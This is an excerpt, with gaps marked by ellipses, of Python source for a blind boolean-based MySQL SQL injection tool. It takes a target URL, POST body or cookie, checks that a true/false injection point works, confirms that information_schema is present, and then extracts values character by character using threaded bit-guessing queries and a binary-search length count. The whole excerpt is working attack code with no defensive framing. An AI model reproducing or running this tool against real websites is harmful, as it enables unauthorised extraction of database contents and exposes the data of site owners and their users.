...
class MysqlTrueFalse:
	...
	def __init__(self, url, post, cookie,verbose=False,error="",modification="0"):
		...
		self.url = re.sub("1=.?1","1=1 W00T",url)
		self.post = re.sub("1=.?1","1=1 W00T",post)
		self.cookie = re.sub("1=.?1","1=1 W00T",cookie)
			
		if re.search("1=.?1",self.url):
			self.target = 1
			self.inject = self.url
			spet = re.findall("1=.?1",url)
		elif re.search("1=.?1",self.post):
			self.target = 2
			self.inject = self.post
			spet = re.findall("1=.?1",post)
		elif re.search("1=.?1",self.cookie):
			self.target = 3
			self.inject = self.cookie
			spet = re.findall("1=.?1",cookie)
	...
	def testInjection(self):
		...
		if self.testTrueFalse():
			print "Bad injection ?"
			sys.exit()
		print "Injection seems good, let's check if information_schema exists..."

		string = self.tricks("(select count(distinct(table_schema)) from information_schema.columns where table_schema='information_schema')=1")
		self.changeInject(string)

		if not(self.testTrueFalse()):
			print "information_schema not found, sorry I can't do anything without it."
			sys.exit()
	...
	def value(self, request, num = 0, size=0, condition = ""):
		
		if size==0:
			size=self.length(request  + condition, num)
			print "%d long" %size
		val=""
		for i in range(size):
			z=0
			...
			for j in range(8):
				if self.limit==1:
					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + condition + " limit " + str(num) + ",1), " + str(i+1) + ", 1))",j,q)))
				else:
					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + condition + "), " + str(i+1) + ", 1))",j,q)))
				t[j].start()
			for j in range(8):
				t[j].join()
				z+=q.get()
	...
	def length(self, request, num = 0, condition = ""):
		if self.limit==1:
			return self.count("select length((" + request  + condition + " limit " + str(num) + ",1))",0,20)
		else:
			return self.count("select length((" + request  + condition + "))",0,20)
	
	def bitGuessing(self, request, bit, queue, condition = ""):
		string = self.tricks("(substring(lpad(conv("+request+condition+",10,2),8,char(0x30)),"+str(bit+1)+",1))=1")
		self.changeInject(string)
		if self.testTrueFalse():
			queue.put(1<<(7-bit))
		else:
	...
	def count(self, request, begin = 0, end = 100, condition = ""):
		a=0
		min=begin
		max=end
		nombre=self.dicho(min,max)
		while a==0:
			string = self.tricks("(" + request + condition + ")<" + str(nombre))
			self.changeInject(string)
			if self.testTrueFalse():
				max=nombre
			else:
			...
			nombre=self.dicho(min,max)
			if (max-min)<2:
				string = self.tricks("(" + request + condition + ")=" + str(min))
				self.changeInject(string)
				if self.testTrueFalse():
					nombre=min
					a=1
				else:
					string = self.tricks("(" + request + condition + ")=" + str(max))
					self.changeInject(string)
					if self.testTrueFalse():
						nombre=max
						a=1
...
if __name__ == "__main__":
	...
	myInjector = MysqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification)
